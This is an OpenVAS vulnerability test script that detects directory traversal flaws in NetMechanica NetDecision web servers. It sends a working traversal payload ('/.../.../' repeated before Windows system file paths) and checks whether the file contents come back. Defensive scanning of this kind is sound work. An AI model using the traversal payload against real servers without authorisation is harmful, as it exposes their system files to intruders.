###############################################################################
# OpenVAS Vulnerability Test
#
# NetDecision Multiple Directory Traversal Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (C) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802618");
  script_bugtraq_id(52327);
  script_version("2020-08-24T15:18:35+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)");
  script_tag(name:"creation_date", value:"2012-03-09 16:16:16 +0530 (Fri, 09 Mar 2012)");
  script_name("NetDecision Multiple Directory Traversal Vulnerabilities");

  script_xref(name:"URL", value:"http://secunia.com/advisories/48269");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/52327");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/73714");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/73715");
  script_xref(name:"URL", value:"http://aluigi.altervista.org/adv/netdecision_1-adv.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80, 8087, 8090);
  script_mandatory_keys("NetDecision-HTTP-Server/banner");

  script_tag(name:"impact", value:"Successful exploitation may allow an attacker to obtain sensitive
  information, which can lead to launching further attacks.");

  script_tag(name:"affected", value:"NetMechanica NetDecision 4.6.1 and prior.");

  script_tag(name:"insight", value:"Multiple flaws are due to an input validation error in the
  NOCVision server and Traffic Grapher server when processing web requests
  can be exploited to disclose arbitrary files via directory traversal attacks.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"The host is running NetDecision and is prone to multiple directory
  traversal vulnerabilities.");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("host_details.inc");
include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

ports = http_get_ports(default_port_list:make_list(80, 8087, 8090));
files = traversal_files("windows");

foreach port (ports) {

  banner = http_get_remote_headers(port: port);
  if(!banner || "Server: NetDecision-HTTP-Server" >!< banner)
    continue;

  foreach file(keys(files)) {

    path = "/.../.../.../.../.../.../.../.../" + files[file];

    if(http_vuln_check(port:port, url:path, pattern:file, check_header:TRUE)) {
      report = http_report_vuln_url( port:port, url:path);
      security_message(port:port, data:report);
      exit(0);
    }
  }
}

exit(99);
